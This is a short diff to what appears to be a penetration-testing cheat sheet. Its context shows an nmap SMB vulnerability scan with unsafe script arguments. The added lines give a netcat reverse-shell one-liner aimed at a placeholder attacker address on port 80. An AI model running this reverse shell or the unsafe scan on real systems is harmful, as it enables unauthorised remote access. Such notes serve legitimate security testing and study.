@@ -10,4 +10,8 @@ Scan for vulnerable SMB servers:
 ``nmap -v -p 445 --script=smb-check-vulns 
 --script-args=unsafe=1 192.168.1.0/24``
 
+use netcat to spawn a reverse shell:
+
+``nc -e /bin/sh SOME-IP-ADDRESS 80``
+
 todo: add metasploit/bash automated scanners
